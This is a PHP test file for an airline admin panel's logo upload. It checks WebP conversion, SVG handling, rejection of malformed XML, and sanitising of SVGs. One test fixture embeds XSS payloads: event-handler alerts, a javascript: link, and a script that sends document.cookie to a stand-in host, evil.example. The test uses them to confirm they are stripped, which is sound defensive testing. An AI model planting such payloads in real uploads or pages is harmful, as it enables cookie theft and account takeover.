<?php

declare(strict_types=1);

use App\Filament\Resources\Airlines\Pages\EditAirline;
use App\Http\Middleware\UpdatePending;
use App\Models\Airline;
use Database\Seeders\RolesPermissionsSeeder;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;

beforeEach(function (): void {
    Storage::fake(config('filesystems.public_files'));
    $this->seed(RolesPermissionsSeeder::class);
    $this->withoutMiddleware(UpdatePending::class);
    $this->actingAs(createAdminUser());
});

/**
 * The logo field routes through ImageUploadService like every other admin
 * image upload. A PNG drop must land as WebP, and Airline::logo()'s setter
 * (Airline.php:175-186) must still stamp logo_hash off whatever path is
 * actually saved.
 */
it('converts an uploaded PNG logo to webp and stamps logo_hash', function (): void {
    $airline = Airline::factory()->create(['icao' => 'ABC', 'iata' => 'AB', 'country' => 'us', 'logo' => null, 'logo_hash' => null]);

    Livewire::test(EditAirline::class, ['record' => $airline->id])
        ->set('data.logo', UploadedFile::fake()->image('logo.png', 64, 64));

    $airline->refresh();

    expect($airline->logo)->toEndWith('.webp')
        ->and($airline->logo_hash)->not->toBeNull();

    Storage::disk(config('filesystems.public_files'))->assertExists($airline->logo);
});

/**
 * SVG is resolution-independent and GD cannot rasterise it (NotReadableException
 * on `<svg`), so ImageUploadService keeps it vector rather than attempt a
 * conversion. The logo field explicitly accepts image/svg+xml. The drawing
 * itself must survive the sanitizer untouched.
 */
it('keeps an uploaded SVG logo vector and preserves its drawing', function (): void {
    $airline = Airline::factory()->create(['icao' => 'ABC', 'iata' => 'AB', 'country' => 'us', 'logo' => null, 'logo_hash' => null]);

    $svg = UploadedFile::fake()->createWithContent(
        'logo.svg',
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>',
    );

    Livewire::test(EditAirline::class, ['record' => $airline->id])
        ->set('data.logo', $svg);

    $airline->refresh();

    expect($airline->logo)->toEndWith('.svg');

    $stored = Storage::disk(config('filesystems.public_files'))->get($airline->logo);
    expect($stored)->toContain('<svg');
});

/**
 * An SVG is an XML document the browser executes when its URL is opened
 * directly, so a `<script>` or an `onload=` in an uploaded logo would run
 * with the site's cookies. ImageUploadService::sanitizeSvg() strips those
 * before the bytes ever reach the public disk.
 */
it('strips script and event handlers from an uploaded SVG logo', function (): void {
    $airline = Airline::factory()->create(['icao' => 'ABC', 'iata' => 'AB', 'country' => 'us', 'logo' => null, 'logo_hash' => null]);

    $svg = UploadedFile::fake()->createWithContent(
        'logo.svg',
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)">'
            .'<rect width="10" height="10" onclick="alert(2)"/>'
            .'<script>fetch("https://evil.example/?c=" + document.cookie)</script>'
            .'<a href="javascript:alert(3)"><text>x</text></a>'
            .'</svg>',
    );

    Livewire::test(EditAirline::class, ['record' => $airline->id])
        ->set('data.logo', $svg);

    $airline->refresh();

    $stored = Storage::disk(config('filesystems.public_files'))->get($airline->logo);

    expect($stored)
        ->not->toContain('<script')
        ->not->toContain('evil.example')
        ->not->toContain('onload')
        ->not->toContain('onclick')
        ->not->toContain('javascript:')
        // The drawing still has to come out the other side.
        ->toContain('<rect');
});

/**
 * Fail closed. A file that will not parse as XML is not an SVG, and storing
 * it under a `.svg` name on a public disk would serve unreviewed bytes as a
 * document. Rejecting the upload is the only safe outcome.
 */
it('rejects an SVG upload that will not parse as XML', function (): void {
    $airline = Airline::factory()->create(['icao' => 'ABC', 'iata' => 'AB', 'country' => 'us', 'logo' => null, 'logo_hash' => null]);

    $bad = UploadedFile::fake()->createWithContent('logo.svg', 'this is not xml at all <<<');

    expect(fn () => Livewire::test(EditAirline::class, ['record' => $airline->id])->set('data.logo', $bad))
        ->toThrow(RuntimeException::class);

    expect($airline->refresh()->logo)->toBeNull();
});
